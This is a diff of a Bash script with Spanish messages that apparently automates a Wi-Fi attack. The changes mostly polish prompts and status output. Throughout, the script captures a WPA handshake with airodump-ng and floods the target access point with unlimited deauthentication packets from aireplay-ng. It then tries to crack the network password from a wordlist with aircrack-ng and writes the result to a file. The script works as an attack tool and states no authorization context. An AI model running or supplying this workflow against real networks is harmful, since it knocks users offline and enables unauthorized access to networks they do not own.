@@ -157,26 +157,38 @@ echo -e "$BOLD_WHITE BSSID: $WHITE$BSSID"
 echo -e "$BOLD_WHITE Canal: $WHITE$CANAL"
 rm info-01.csv
 
-#Comprobamos que tipo de terminal esta usando para ejecutar el siguiente c omando en una ventana aparte
+clear 
+echo -e "$BOLD_RED Se va a proceder a realizar el ataque, cierre las dos ventanas cuando el hanshake haya sido capturado$WHITE"
+
+#Comprobamos que tipo de terminal esta usando para ejecutar el siguiente comando en una ventana aparte
 TERM=$(ps -o comm= -p "$(($(ps -o ppid= -p "$(($(ps -o sid= -p "$$")))")))")
-echo -e "$TERM"
 
 #Empezamos a capturar hasta encontrar el handshake
+echo -e "$BOLD_WHITE Ejecutando airodump-ng para el monitoreo de la red$WHITE"
 $TERM -e airodump-ng -w handshake --output-format cap -c $CANAL --bssid $BSSID $INT_NAME & 
-echo "¿esto continua?"
 
 sleep 5
 
 #Lanzamos el ataque (paquetes de deautentificacion)
-echo -e "$BOLD_RED Enviando paquetes de deautentificacion $WHITE"
+echo -e "$BOLD_WHITE Ejecutando aireplay-ng para el lanzamiento de paquetes de deautenticación$WHITE"
 $TERM -e aireplay-ng --deauth 0 -a $BSSID $INT_NAME 
 
 #Probamos a crackear la contraseña
-echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
-read WORDLIST
-echo -e "Probando crackeo de la contraseña..."
-aircrack-ng handshake-01.cap -w $WORDLIST >> crack.txt
+SI_NO=test
+while [[ "$SI_NO" != "S" && "$SI_NO" != "s" && "$SI_NO" != "n" && "$SI_NO" != "N" ]]
+do
+    echo -e -n "$WHITE ¿Desea intentar crackear la contraseña?(S/N) $BOLD_WHITE\033[5m>\033[0m "
+    read SI_NO
+done
 
-echo "Pasando a modo managed"
+if [[ "$SI_NO" == "S" || "$SI_NO" == "s" ]]
+then
+    echo -e -n "Introduce el nombre del wordlist $BOLD_WHITE\033[5m>\033[0m "
+    read WORDLIST
+    echo -e "Probando crackeo de la contraseña..."
+    aircrack-ng handshake-01.cap -w $WORDLIST >> crack.txt
+fi
+
+echo " Restaurando interface a modo normal"
 manage_mode $INT_NAME
 
